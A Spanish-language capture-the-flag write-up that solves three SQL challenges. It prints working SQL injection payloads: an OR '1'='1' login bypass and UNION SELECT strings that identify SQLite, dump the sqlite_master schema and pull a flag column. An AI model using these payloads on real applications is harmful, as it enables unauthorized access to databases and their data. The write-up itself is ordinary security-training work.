# SQLiLite
Para resolver este reto hay que hacer SQL injection. 

Usuario: `admin' OR '1'='1`
Contraseña: Realmente valdría cualquier cosa. Como no verifica, nisiquiera puse. 

De esta forma, la query queda:
`SELECT * FROM users WHERE name='admin' OR  '1'='1' AND password=''` 

Al usarlo, aparece el siguiente mensaje. 
![](imágenes/Pasted%20image%2020240913011501.png)

Inspeccionando, veo la flag:
![](imágenes/Pasted%20image%2020240913011529.png)

# SQL Direct
En este caso nos pide conectarnos a una base de datos postgres para buscar la flag. Con `\dt`, vemos las tablas de la base de datos a la que nos conectamos:
![](imágenes/Pasted%20image%2020240913011824.png)

Mirando el contenido de esa tabla, veo la flag:
![](imágenes/Pasted%20image%2020240913011906.png)

# More SQLi
Intento usar lo mismo que hice en SQLiLite, pero no me da resultado, ya que el orden de la sentencia no es el mismo:
![](imágenes/Pasted%20image%2020240913012152.png)

Usuario: `admin
Contraseña: `p' OR '1'='1';--`

Lo primero que veo es que hay un buscador de ciudades, con 3 columnas de información: 
![](imágenes/Pasted%20image%2020240913014243.png)

Investigando, veo que pruebo usar el selector para primeramente comprobar si las columnas. Introduciendo `' UNION SELECT 1,2,3;--`:
![](imágenes/Pasted%20image%2020240913014841.png)

Al saber que tengo 3 columnas, puedo sustituir uno de esos números por una [forma de encontrar la versión de la BD](https://security.stackexchange.com/questions/94419/sql-injection-find-sql-platform). Sabiendo qué comando funcionó, sabré qué SGBD hay. 

Al funcionar `' UNION SELECT sqlite_version(),2,3;--` , sé que es sqlite:
![](imágenes/Pasted%20image%2020240913015047.png)

Investigo y [encuentro](https://www.sqlite.org/schematab.html) que sqlite_schema (que se llamar de otras formas, en este caso sqlite_master) contiene información sobre las tablas. Uso `' UNION SELECT type,sql,tbl_name FROM sqlite_master;--` para ver las tablas:
![](imágenes/Pasted%20image%2020240913015653.png)

Al tener una columna "flag", miro el contenido de more_table, encontrando la flag: 
`' UNION SELECT null,null,flag FROM more_table;--`

![](imágenes/Pasted%20image%2020240913015812.png)

